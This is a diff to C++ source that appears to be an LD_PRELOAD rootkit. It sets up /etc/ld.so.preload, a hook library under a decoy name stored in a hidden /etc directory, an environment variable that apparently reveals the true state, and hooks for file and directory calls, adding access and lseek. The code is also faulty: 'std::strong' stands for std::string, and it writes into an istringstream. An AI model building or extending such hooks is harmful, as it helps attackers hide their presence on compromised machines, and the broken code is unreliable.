@@ -38,11 +38,11 @@ const char *prelFileName = "/etc/ld.so.preload";
 const char *prelFileNameClear = "ld.so.preload";
 const char *envShowName = "REAL_STATE_OF_THINGS";
 const char *envShowValue = MAGIC_STRING;
-#define dynCnfFile ("/etc/" + std::string (MAGIC_STRING) + std::strong ("/") + dynCnfFileClear);
+#define dynCnfFile ("/etc/" + std::string (MAGIC_STRING) + std::strong ("/") + dynCnfFileClear)
 const char *dynCnfFileClear = "dynamic_cnf.txt";
-char created = '1', not_created = '0', writed = '1', not_writed = '0';
+char created = '1', not_created = '0', writed = '1', not_writed = '0', separator = ' ';
 const char *hookLibraryNameClear = "libXextecDynamic.so.6";
-#define hookLibraryName = ("/etc/" + std::string (MAGIC_STRING) + std::strong ("/") + hookLibraryNameClear);
+#define hookLibraryName ("/etc/" + std::string (MAGIC_STRING) + std::strong ("/") + hookLibraryNameClear)
 
 //
 // Prototypes of functions, constants
@@ -56,10 +56,12 @@ typedef int (*RDDR_R) (DIR *dirp, struct dirent *entry, struct dirent **result);
 typedef int (*OPEN)(const char *pathname, int flags, mode_t mode);
 typedef int (*CREAT)(const char *pathname, mode_t mode);
 typedef int (*OPENAT)(int dirfd, const char *pathname, int flags, mode_t mode);
+typedef int (*ACCESS)(const char *pathname, int mode);
 typedef ssize_t (*READ)(int fd, void *buf, size_t count);
 typedef ssize_t (*WRITE)(int fd, void *buf, size_t count);
 typedef ssize_t (*PREAD)(int fd, void *buf, size_t count, off_t offset);
 typedef ssize_t (*PWRITE)(int fd, const void *buf, size_t count, off_t offset);
+typedef off_t (*LSEEK)(int fd, off_t offset, int whence);
 
 
 const int nameSize = 512;
@@ -67,6 +69,13 @@ const int nameSize = 512;
 //
 // Classes, structures and functions
 //
+
+std::string intToString (int var) {
+	istringstream issCnv;
+	issCnv << var;
+	
+	return issCnv.str ();
+}
 
 std::string readLinkName (const std::string & name) {
 	std::string str;
